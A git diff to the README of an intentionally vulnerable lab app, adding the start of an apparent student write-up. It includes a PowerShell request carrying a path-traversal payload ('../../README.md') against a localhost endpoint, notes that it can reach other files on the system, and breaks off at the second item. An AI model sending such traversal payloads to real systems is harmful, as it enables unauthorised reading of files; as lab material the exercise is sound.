@@ -14,4 +14,18 @@ Alternatively, you can use Docker:
 
 # Experiments
 
-This challenges have three vulnerabilities: OS command injection, prototype pollution and path traversal. Your task is to find out what you can do with these vulnerabilities.
+These challenges have three vulnerabilities: OS command injection, prototype pollution and path traversal. Your task is to find out what you can do with these vulnerabilities.
+
+
+# Tasks 1-4:
+To make the following requests, I build HTTP Requests using Powershell's Invoke-WebRequest and its associated 
+
+1. Path Traversal Exploit:
+
+   ```PowerShell
+   $postParams = @{id="../../README.md"} \n
+   Invoke-WebRequest -Uri http://localhost:80/img -Method GET -Body $postParams
+   ```
+   This example specifically hits this README, but you can use this to access further files on the user's system.
+
+2. d
